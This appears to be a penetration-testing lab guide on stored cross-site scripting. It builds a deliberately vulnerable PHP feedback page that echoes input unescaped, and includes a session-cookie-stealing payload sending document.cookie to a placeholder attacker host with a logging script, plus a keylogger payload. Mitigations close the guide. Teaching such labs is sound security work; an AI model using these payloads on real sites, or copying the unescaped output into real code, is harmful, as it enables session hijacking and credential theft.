@@ -1,0 +1,191 @@
+6.) Lab Title: Exploiting Cross-Site Scripting (XSS) in a Web
+Application
+Problem Statement:
+A small business has deployed a feedback management web
+application to collect customer reviews. Due to improper input
+validation, users have reported strange pop-up messages while
+browsing the site. As a penetration tester using Kali Linux, your task is
+to identify and exploit the Cross-Site Scripting (XSS) vulnerability to
+demonstrate its impact.
+Objective:
+The goal of this exercise is to exploit a Cross-Site Scripting (XSS)
+vulnerability in a feedback management application to demonstrate
+the potential impact on users (e.g., stealing session cookies,
+spreading malicious scripts, etc.).
+
+Step-by-Step Guide:
+1. Set up the Target Environment:
+You will need a Virtual Machine (VM) running a LAMP stack (Linux,
+Apache, MySQL, PHP). This environment mimics a real-world
+application setup.
+1.1. Setting up the VM:
+• Use VirtualBox or VMware to create a virtual machine.
+• Install a Linux distribution such as Ubuntu Server or Kali Linux
+on the VM.
+• Install LAMP stack (Linux, Apache, MySQL, PHP) on your VM.
+Install Apache:
+sudo apt update
+
+sudo apt install apache2
+Install MySQL:
+sudo apt install mysql-server
+Install PHP:
+sudo apt install php libapache2-mod-php php-mysql
+Ensure all services are running correctly:
+sudo systemctl start apache2
+sudo systemctl start mysql
+1.2. Create the Feedback Management Application (PHP-based)
+Create a feedback.php file on your Apache server to simulate a
+vulnerable feedback submission system:
+<?php
+$host = 'localhost';
+$db = 'feedback';
+$user = 'root';
+$pass = '';
+
+$pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
+$pdo->setAttribute(PDO::ATTR_ERRMODE,
+PDO::ERRMODE_EXCEPTION);
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+$feedback = $_POST['feedback'];
+
+// Insert feedback into database without sanitization (vulnerable to
+XSS)
+$stmt = $pdo->prepare("INSERT INTO feedbacks (content) VALUES
+(:content)");
+$stmt->bindParam(':content', $feedback);
+$stmt->execute();
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-
+scale=1.0">
+
+<title>Customer Feedback</title>
+</head>
+<body>
+<h1>Customer Feedback</h1>
+<form action="" method="POST">
+<textarea name="feedback" rows="5" cols="40"
+placeholder="Leave your feedback"></textarea><br>
+<input type="submit" value="Submit Feedback">
+</form>
+<hr>
+<h2>Previous Feedback</h2>
+
+<?php
+$stmt = $pdo->query("SELECT content FROM feedbacks");
+while ($row = $stmt->fetch()) {
+echo "<p>" . $row['content'] . "</p>"; // Vulnerable output
+}
+?>
+</body>
+</html>
+1.3. Database Setup:
+Create the database and the table to store feedback.
+CREATE DATABASE feedback;
+USE feedback;
+
+CREATE TABLE feedbacks (
+id INT AUTO_INCREMENT PRIMARY KEY,
+content TEXT NOT NULL
+);
+This PHP application allows users to submit feedback and view
+previous submissions. However, because it doesn't sanitize or escape
+the user input, it’s vulnerable to XSS attacks.
+
+2. Set up the Attacking Machine:
+Your attacking machine will be Kali Linux, which is pre-equipped with
+tools for penetration testing.
+2.1. Update Kali Linux: Ensure Kali Linux is up to date.
+
+sudo apt update
+sudo apt upgrade
+2.2. Set up Burp Suite:
+Burp Suite is an essential tool for testing web vulnerabilities like XSS.
+It helps you intercept, analyze, and modify web traffic.
+sudo apt install burpsuite
+Launch Burp Suite by typing burpsuite in the terminal and set up the
+proxy to intercept the traffic between the attacker machine and the
+target VM.
+2.3. Proxy Configuration:
+Configure your browser to use the Kali Linux proxy (typically
+127.0.0.1:8080).
+
+3. Exploiting the XSS Vulnerability:
+Now that you have set up the target application and the attacking
+machine, it's time to exploit the XSS vulnerability.
+3.1. Intercepting Traffic with Burp Suite:
+• Open your browser and go to the feedback management
+application hosted on your LAMP stack (e.g.,
+http://target_vm_ip/feedback.php).
+• Use Burp Suite to intercept the HTTP request containing the
+submitted feedback.
+• Modify the feedback field to include a malicious script:
+<script>alert('XSS Vulnerability Exploited!');</script>
+Submit the feedback with this payload.
+3.2. Observing XSS Impact:
+
+• Visit the feedback section of the application again.
+• If the application is vulnerable to XSS, you’ll see the alert box
+pop up with the message "XSS Vulnerability Exploited!"
+
+4. Steps to Exploit Further:
+You can exploit the XSS vulnerability for more sophisticated attacks.
+Here are some possible scenarios:
+4.1. Stealing Cookies (Session Hijacking):
+Modify the XSS payload to steal the session cookies of users. An
+example payload:
+<script>document.location='http://attacker_ip/steal_cookie.php?coo
+kie=' + document.cookie;</script>
+On the attacker’s machine, create a PHP script (steal_cookie.php) to
+log the cookies sent:
+<?php
+if (isset($_GET['cookie'])) {
+file_put_contents('cookies.txt', $_GET['cookie'] . "\n",
+FILE_APPEND);
+}
+?>
+Whenever the malicious script runs, the victim’s session cookies are
+sent to the attacker.
+4.2. Keylogging:
+You could use XSS to inject a keylogger script that records keystrokes
+from users.
+<script>
+
+document.onkeypress = function(e) {
+fetch('http://attacker_ip/log.php?key=' +
+String.fromCharCode(e.keyCode));
+};
+</script>
+In this example, the attacker logs every keystroke made by the victim.
+
+5. Mitigating XSS Vulnerabilities:
+Once the vulnerability has been demonstrated, it’s important to
+discuss mitigation techniques, such as:
+• Input Sanitization: Ensure all user inputs are properly sanitized.
+Use libraries such as htmlspecialchars() in PHP to escape special
+characters.
+• $safe_feedback = htmlspecialchars($_POST['feedback']);
+• Content Security Policy (CSP): Implement CSP headers to limit
+the types of content that can be loaded by the page.
+• Header set Content-Security-Policy "default-src 'self';"
+• HTTPOnly and Secure Cookies: Set cookies with HttpOnly and
+Secure flags to prevent JavaScript from accessing session
+cookies.
+
+6. Conclusion:
+In this lab, you've successfully identified and exploited an XSS
+vulnerability in a PHP-based feedback management application. You
+used Kali Linux and Burp Suite to intercept and modify requests,
+enabling the exploitation of the XSS vulnerability. Finally, you
+
+reviewed possible attacks like session hijacking and discussed ways to
+mitigate such vulnerabilities in a real-world scenario.
+This setup allows you to practice testing for and exploiting XSS
+vulnerabilities in a controlled, offline environment.
